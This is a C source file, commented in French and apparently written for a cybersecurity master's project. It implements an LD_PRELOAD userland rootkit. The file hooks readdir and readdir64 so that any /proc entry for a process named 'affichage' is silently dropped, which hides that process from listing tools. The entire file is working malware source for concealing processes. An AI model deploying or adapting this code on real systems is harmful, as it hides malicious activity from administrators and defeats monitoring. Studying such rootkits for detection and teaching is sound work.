/*
 * hook_userspace.c - Interception de lecture de répertoires /proc
 * 
 * Technique: LD_PRELOAD pour masquer un processus au niveau user-space
 * Auteur: Projet Master Cybersécurité
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <ctype.h>

/* Processus à rendre invisible */
#define HIDDEN_PROCESS_NAME "affichage"

/* Pointeurs vers fonctions originales de la libc */
static struct dirent* (*orig_readdir)(DIR*) = NULL;
static struct dirent64* (*orig_readdir64)(DIR*) = NULL;

/**
 * Vérifie si une chaîne ne contient que des chiffres
 */
static int est_numerique(const char* chaine) {
    if (!chaine || *chaine == '\0') 
        return 0;
    
    for (const char* c = chaine; *c; c++) {
        if (!isdigit(*c)) 
            return 0;
    }
    return 1;
}

/**
 * Récupère le chemin du répertoire associé à un DIR*
 */
static int obtenir_chemin_dir(DIR* repertoire, char* buffer, size_t taille) {
    if (!repertoire || !buffer || taille == 0) 
        return 0;
    
    int descripteur = dirfd(repertoire);
    if (descripteur == -1) 
        return 0;
    
    char lien_fd[64];
    snprintf(lien_fd, sizeof(lien_fd), "/proc/self/fd/%d", descripteur);
    
    ssize_t longueur = readlink(lien_fd, buffer, taille - 1);
    if (longueur == -1) 
        return 0;
    
    buffer[longueur] = '\0';
    return 1;
}

/**
 * Détermine si un PID doit être masqué
 */
static int doit_masquer_pid(const char* pid_string) {
    if (!est_numerique(pid_string)) 
        return 0;
    
    /* Construire chemin vers /proc/[PID]/comm */
    char chemin_comm[512];
    snprintf(chemin_comm, sizeof(chemin_comm), "/proc/%s/comm", pid_string);
    
    FILE* fichier = fopen(chemin_comm, "r");
    if (!fichier) 
        return 0;
    
    /* Lire le nom du processus */
    char nom_processus[256];
    if (fgets(nom_processus, sizeof(nom_processus), fichier) == NULL) {
        fclose(fichier);
        return 0;
    }
    fclose(fichier);
    
    /* Supprimer le retour à la ligne */
    size_t longueur = strlen(nom_processus);
    if (longueur > 0 && nom_processus[longueur - 1] == '\n') {
        nom_processus[longueur - 1] = '\0';
    }
    
    /* Vérifier si c'est notre processus cible */
    return (strcmp(nom_processus, HIDDEN_PROCESS_NAME) == 0);
}

/**
 * Interception de readdir() - version standard
 */
struct dirent* readdir(DIR* repertoire) {
    /* Résolution dynamique de la fonction originale */
    if (orig_readdir == NULL) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (orig_readdir == NULL) {
            fprintf(stderr, "Erreur dlsym: %s\n", dlerror());
            return NULL;
        }
    }
    
    struct dirent* entree;
    
    /* Parcourir jusqu'à trouver une entrée valide */
    while ((entree = orig_readdir(repertoire)) != NULL) {
        /* Vérifier si on lit /proc */
        char chemin[512];
        if (!obtenir_chemin_dir(repertoire, chemin, sizeof(chemin))) {
            return entree;
        }
        
        /* Si ce n'est pas /proc, retourner normalement */
        if (strcmp(chemin, "/proc") != 0) {
            return entree;
        }
        
        /* Filtrer le PID si nécessaire */
        if (doit_masquer_pid(entree->d_name)) {
            continue; /* Sauter cette entrée */
        }
        
        return entree;
    }
    
    return NULL;
}

/**
 * Interception de readdir64() - version 64 bits
 */
struct dirent64* readdir64(DIR* repertoire) {
    /* Résolution dynamique de la fonction originale */
    if (orig_readdir64 == NULL) {
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (orig_readdir64 == NULL) {
            fprintf(stderr, "Erreur dlsym: %s\n", dlerror());
            return NULL;
        }
    }
    
    struct dirent64* entree;
    
    /* Parcourir jusqu'à trouver une entrée valide */
    while ((entree = orig_readdir64(repertoire)) != NULL) {
        /* Vérifier si on lit /proc */
        char chemin[512];
        if (!obtenir_chemin_dir(repertoire, chemin, sizeof(chemin))) {
            return entree;
        }
        
        /* Si ce n'est pas /proc, retourner normalement */
        if (strcmp(chemin, "/proc") != 0) {
            return entree;
        }
        
        /* Filtrer le PID si nécessaire */
        if (doit_masquer_pid(entree->d_name)) {
            continue;
        }
        
        return entree;
    }
    
    return NULL;
}
